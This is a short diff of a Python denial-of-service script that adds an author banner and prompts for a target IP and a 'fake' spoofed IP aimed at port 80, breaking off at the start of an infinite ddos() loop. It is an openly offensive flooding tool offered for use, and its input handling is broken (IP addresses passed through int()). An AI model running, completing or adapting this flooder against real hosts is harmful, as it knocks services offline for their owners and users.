@@ -1,9 +1,18 @@
 import socket
 import threading
+import time
 
-target = "192.168.8.1"
+G = "\u001b[32m"
+C = "\u001b[36m"
+
+print("\u001b[33;1mThis Script is Created By \u001b[34;1mShervin.BDN")
+print("\u001b[32;1mMy GitHub {" + "https://github.com/shervin-glitch" + "\u001b[32;1m}\n\r")
+
+time.sleep(2.5)
+
+target = int(input(G + "Enter The Target's IP =>"))
 port = 80
-fake_ip = "182.30.23.31"
+fake_ip = int(input(G + "Enter Your Fake IP Here =>"))
 
 def ddos():
     while True:
